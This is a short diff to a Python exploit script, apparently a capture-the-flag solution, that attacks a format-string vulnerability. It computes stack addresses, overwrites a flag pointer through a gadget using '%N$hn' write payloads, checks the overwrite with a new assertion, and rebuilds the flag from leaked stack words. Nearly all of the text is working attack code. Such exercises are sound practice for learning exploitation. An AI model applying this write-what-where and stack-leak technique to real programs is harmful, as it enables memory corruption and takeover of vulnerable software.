@@ -116,7 +116,7 @@ def exploit() -> bool:
     addrs["gadget"] = addrs["buffer"] + (8 * (indices["gadget"] - indices["buffer"]))
     addrs["target"] = addrs["buffer"] + (8 * (indices["target"] - indices["buffer"]))
     io.info(
-        f"Writing {hex(addrs['target'])} to {hex(addrs['flag'])} @ {hex(addrs['gadget'])}"
+        f"Writing {hex(addrs['target'])} to {hex(addrs['flag'])} using gadget at {hex(addrs['gadget'])}"
     )
 
     # the address of the gadget
@@ -135,13 +135,19 @@ def exploit() -> bool:
         payload += f"%{indices['gadget']}$hn"
         send_payload(io, payload.encode("ascii"))
 
+    # ensuring that the gadget contains the right address
+    test = int(get_stack_var(io, indices["flag"]), 16)
+    assert (
+        test == addrs["target"]
+    ), f"Couldn't overwrite the flag pointer, expected {hex(addrs["target"])}, was {hex(test)}"
+
     # reading the flag
     read_flag(io)
 
     # reconstructing the flag
     parts = []
     for i in range(0, 4):
-        parts.append(get_stack_var(io, indices["target"] + i)[:16].rjust(14, b'0'))
+        parts.append(get_stack_var(io, indices["target"] + i)[:16].rjust(16, b"0"))
 
     flag = "".join(
         map(lambda x: bytes.fromhex(x.decode("ascii")).decode("ascii")[::-1], parts)
